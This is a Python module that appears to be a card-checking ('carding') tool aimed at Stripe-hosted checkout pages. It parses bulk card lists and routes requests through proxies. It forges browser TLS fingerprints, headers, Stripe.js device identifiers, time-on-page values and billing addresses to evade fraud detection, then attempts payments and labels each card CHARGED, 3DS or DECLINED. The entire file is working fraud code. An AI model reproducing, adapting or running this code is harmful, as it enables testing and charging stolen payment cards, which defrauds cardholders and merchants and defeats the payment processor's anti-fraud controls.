import re
import time
import random
import string
import uuid

# Try curl_cffi first for TLS/JA3 fingerprint impersonation, fallback to aiohttp
try:
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False

import aiohttp


# ─── Stripe API version (must match real Stripe.js) ───
STRIPE_API_VERSION = "2024-12-18.acacia"

# ─── Browser User-Agent pool (matches co.py) ───
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
]

# ─── Billing address pool ───
BILLING_ADDRESSES = [
    {"name": "James Wilson", "line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704", "country": "US"},
    {"name": "Sarah Johnson", "line1": "1520 Oak Street", "city": "San Francisco", "state": "CA", "zip": "94117", "country": "US"},
    {"name": "Michael Brown", "line1": "308 Meadow Lane", "city": "Austin", "state": "TX", "zip": "78701", "country": "US"},
    {"name": "Emily Davis", "line1": "2145 Birch Drive", "city": "Denver", "state": "CO", "zip": "80202", "country": "US"},
    {"name": "Robert Martinez", "line1": "987 Pine Avenue", "city": "Miami", "state": "FL", "zip": "33101", "country": "US"},
    {"name": "Jessica Taylor", "line1": "1100 Maple Road", "city": "Seattle", "state": "WA", "zip": "98101", "country": "US"},
    {"name": "David Anderson", "line1": "456 Cedar Boulevard", "city": "Portland", "state": "OR", "zip": "97201", "country": "US"},
    {"name": "Ashley Thomas", "line1": "2301 Elm Street", "city": "Chicago", "state": "IL", "zip": "60601", "country": "US"},
    {"name": "Christopher Lee", "line1": "789 Walnut Court", "city": "Boston", "state": "MA", "zip": "02101", "country": "US"},
    {"name": "Amanda White", "line1": "1435 Spruce Way", "city": "Nashville", "state": "TN", "zip": "37201", "country": "US"},
]

# Per-user persistent muid (simulates browser cookie __stripe_mid)
_user_fingerprints = {}


# ─── Fingerprint generators ───

def _rand_hex(length: int) -> str:
    return ''.join(random.choices(string.hexdigits[:16], k=length))

def _uuid_format() -> str:
    """Generate UUID v4 format string."""
    return f"{_rand_hex(8)}-{_rand_hex(4)}-4{_rand_hex(3)}-{random.choice('89ab')}{_rand_hex(3)}-{_rand_hex(12)}"

def generate_fingerprints(user_id: int = None) -> dict:
    """Generate Stripe.js fingerprint identifiers.
    muid = persistent per user (like __stripe_mid cookie).
    guid = per page load. sid = per session."""
    if user_id and user_id in _user_fingerprints:
        muid = _user_fingerprints[user_id]
    else:
        muid = _uuid_format()
        if user_id:
            _user_fingerprints[user_id] = muid
    
    guid = _uuid_format()
    sid = _uuid_format()
    return {"muid": muid, "guid": guid, "sid": sid}

def generate_eid() -> str:
    """Generate a valid UUID v4 for the eid parameter."""
    return str(uuid.uuid4())

def generate_stripe_js_agent() -> str:
    """Generate a realistic Stripe.js payment_user_agent string."""
    # Real format from Stripe.js CDN
    build_hash = _rand_hex(10)
    return f"stripe.js%2F{build_hash}%3B+stripe-js-v3%2F{build_hash}%3B+checkout"

def get_stripe_cookies(fp: dict) -> str:
    """Generate Stripe cookie header mimicking real browser."""
    return f"__stripe_mid={fp['muid']}; __stripe_sid={fp['sid']}"

def _detect_browser_info(ua: str) -> dict:
    """Extract browser name, version, and platform from user agent string."""
    info = {"browser": "Chrome", "version": "131", "platform": "Windows"}
    
    if "Macintosh" in ua or "Mac OS X" in ua:
        info["platform"] = "macOS"
    elif "Linux" in ua:
        info["platform"] = "Linux"
    
    if "Edg/" in ua:
        info["browser"] = "Edge"
        m = re.search(r'Edg/(\d+)', ua)
        if m: info["version"] = m.group(1)
    elif "OPR/" in ua:
        info["browser"] = "Opera"
        m = re.search(r'Chrome/(\d+)', ua)
        if m: info["version"] = m.group(1)
    elif "Firefox/" in ua:
        info["browser"] = "Firefox"
        m = re.search(r'Firefox/(\d+)', ua)
        if m: info["version"] = m.group(1)
    elif "Safari/" in ua and "Chrome" not in ua:
        info["browser"] = "Safari"
        m = re.search(r'Version/(\d+)', ua)
        if m: info["version"] = m.group(1)
    else:
        info["browser"] = "Chrome"
        m = re.search(r'Chrome/(\d+)', ua)
        if m: info["version"] = m.group(1)
    
    return info


def get_headers(ua: str = None, stripe_js: bool = False) -> dict:
    """Return headers mimicking real Stripe.js browser requests."""
    if not ua:
        ua = random.choice(USER_AGENTS)
    
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://checkout.stripe.com",
        "referer": "https://checkout.stripe.com/",
        "user-agent": ua,
    }
    
    if stripe_js:
        browser = _detect_browser_info(ua)
        v = browser["version"]
        platform = browser["platform"]
        
        headers["accept-language"] = random.choice([
            "en-US,en;q=0.9",
            "en-US,en;q=0.9,id;q=0.8",
            "en-GB,en;q=0.9,en-US;q=0.8",
            "en-US,en;q=0.9,nl;q=0.8",
            "en-US,en;q=0.9,de;q=0.8",
        ])
        headers["sec-fetch-dest"] = "empty"
        headers["sec-fetch-mode"] = "cors"
        headers["sec-fetch-site"] = "same-site"
        
        if browser["browser"] in ("Chrome", "Edge", "Opera"):
            not_a_brands = [
                '"Not(A:Brand";v="24"',
                '"Not_A Brand";v="8"',
                '"Not/A)Brand";v="8"',
                '"Not A(Brand";v="99"',
            ]
            not_a = random.choice(not_a_brands)
            if browser["browser"] == "Edge":
                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Microsoft Edge";v="{v}"'
            else:
                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Google Chrome";v="{v}"'
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = f'"{platform}"'
    
    return headers


# ─── HTTP Session management ───

_aiohttp_session = None

async def _get_aiohttp_session():
    global _aiohttp_session
    if _aiohttp_session is None or _aiohttp_session.closed:
        _aiohttp_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=25, connect=8)
        )
    return _aiohttp_session


async def _post_request(url: str, headers: dict, data: str, proxy_url: str = None) -> dict:
    """Make a POST request using curl_cffi (preferred) or aiohttp (fallback).
    curl_cffi provides real browser TLS/JA3 fingerprint."""
    
    if HAS_CURL_CFFI:
        # curl_cffi with Chrome browser impersonation for matching TLS fingerprint
        try:
            async with CurlAsyncSession(impersonate="chrome131") as s:
                resp = await s.post(
                    url,
                    headers=headers,
                    data=data,
                    proxy=proxy_url,
                    timeout=25,
                )
                return resp.json()
        except Exception as e:
            # Fallback to aiohttp if curl_cffi fails
            print(f"[DEBUG] curl_cffi failed, falling back to aiohttp: {str(e)[:40]}")
    
    # aiohttp fallback
    s = await _get_aiohttp_session()
    kwargs = {"headers": headers, "data": data}
    if proxy_url:
        kwargs["proxy"] = proxy_url
    async with s.post(url, **kwargs) as r:
        return await r.json()


# ─── Card parsing ───

def parse_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_card(line)
            if card:
                cards.append(card)
    return cards


# ─── Stripe checkout init ───

async def init_checkout(pk: str, cs: str, proxy_url: str = None) -> dict:
    """Initialize Stripe checkout session with proper fingerprints."""
    eid = generate_eid()
    headers = get_headers(stripe_js=True)
    body = f"key={pk}&eid={eid}&browser_locale=en-US&redirect_type=url"
    return await _post_request(
        f"https://api.stripe.com/v1/payment_pages/{cs}/init",
        headers=headers,
        data=body,
        proxy_url=proxy_url,
    )


# ─── Main charge function (Stripe.js emulation — 1-step direct confirm) ───

async def charge_card_fast(card: dict, pk: str, cs: str, init_data: dict, 
                           proxy_url: str = None, user_id: int = None) -> dict:
    """Charge card using Stripe.js emulation with full fingerprint integration.
    Uses 1-step direct confirm (matching real browser behavior)."""
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None, "response": None, "time": 0
    }
    
    try:
        # Extract checkout data
        email = init_data.get("customer_email") or "john@example.com"
        checksum = init_data.get("init_checksum", "")
        
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        if lig:
            total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
        elif inv:
            total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
        else:
            pi = init_data.get("payment_intent") or {}
            total = subtotal = pi.get("amount", 0)
        
        # Use customer data if available, otherwise random billing
        cust = init_data.get("customer") or {}
        addr = cust.get("address") or {}
        
        if cust.get("name") or addr.get("line1"):
            name = cust.get("name") or "John Smith"
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "742 Evergreen Terrace"
            city = addr.get("city") or "Springfield"
            state = addr.get("state") or "IL"
            zip_code = addr.get("postal_code") or "62704"
        else:
            billing = random.choice(BILLING_ADDRESSES)
            name = billing["name"]
            country = billing["country"]
            line1 = billing["line1"]
            city = billing["city"]
            state = billing["state"]
            zip_code = billing["zip"]
        
        # ─── Generate all fingerprints ───
        fp = generate_fingerprints(user_id)
        eid = generate_eid()
        pua = generate_stripe_js_agent()
        time_on_page = random.randint(8000, 90000)  # 8-90 seconds realistic
        
        # Randomize pasted_fields (real users sometimes paste, sometimes type)
        pasted = random.choice(["number", "number", "number", ""])
        
        # ─── Build confirm body — Stripe.js style with full fingerprints ───
        conf_body = (
            f"eid={eid}"
            f"&payment_method_data[type]=card"
            f"&payment_method_data[card][number]={card['cc']}"
            f"&payment_method_data[card][cvc]={card['cvv']}"
            f"&payment_method_data[card][exp_month]={card['month']}"
            f"&payment_method_data[card][exp_year]={card['year']}"
            f"&payment_method_data[billing_details][name]={name}"
            f"&payment_method_data[billing_details][email]={email}"
            f"&payment_method_data[billing_details][address][country]={country}"
            f"&payment_method_data[billing_details][address][line1]={line1}"
            f"&payment_method_data[billing_details][address][city]={city}"
            f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
            f"&payment_method_data[billing_details][address][state]={state}"
            f"&payment_method_data[guid]={fp['guid']}"
            f"&payment_method_data[muid]={fp['muid']}"
            f"&payment_method_data[sid]={fp['sid']}"
            f"&payment_method_data[payment_user_agent]={pua}"
            f"&payment_method_data[time_on_page]={time_on_page}"
        )
        if pasted:
            conf_body += f"&payment_method_data[pasted_fields]={pasted}"
        
        conf_body += (
            f"&expected_amount={total}"
            f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
            f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_discount_amount]=0"
            f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
            f"&expected_payment_method_type=card"
            f"&key={pk}"
            f"&init_checksum={checksum}"
        )
        
        # ─── Build headers with cookies ───
        headers = get_headers(stripe_js=True)
        headers["Cookie"] = get_stripe_cookies(fp)
        
        # ─── Send confirm request ───
        conf = await _post_request(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
            headers=headers,
            data=conf_body,
            proxy_url=proxy_url,
        )
        
        # ─── Parse response ───
        if "error" in conf:
            err = conf["error"]
            dc = err.get("decline_code", "")
            msg = err.get("message", "Failed")
            result["status"] = "DECLINED"
            result["response"] = f"{dc.upper()}: {msg}" if dc else msg
        else:
            pi = conf.get("payment_intent") or {}
            st = pi.get("status", "") or conf.get("status", "")
            if st == "succeeded":
                result["status"] = "CHARGED"
                result["response"] = "Charged"
            elif st == "requires_action":
                result["status"] = "3DS"
                result["response"] = "3DS Required"
            elif st == "requires_payment_method":
                result["status"] = "DECLINED"
                result["response"] = "Declined"
            else:
                result["status"] = "UNKNOWN"
                result["response"] = st or "Unknown"
                
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:40]
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result


async def charge_card(card: dict, checkout_data: dict, proxy_url: str = None, user_id: int = None) -> dict:
    """Wrapper: init checkout + charge card with full fingerprints."""
    pk, cs = checkout_data.get("pk"), checkout_data.get("cs")
    if not pk or not cs:
        return {
            "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
            "status": "FAILED", "response": "No PK/CS", "time": 0
        }
    init_data = await init_checkout(pk, cs, proxy_url=proxy_url)
    if "error" in init_data:
        return {
            "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
            "status": "FAILED",
            "response": init_data["error"].get("message", "Init failed"),
            "time": 0
        }
    return await charge_card_fast(card, pk, cs, init_data, proxy_url=proxy_url, user_id=user_id)
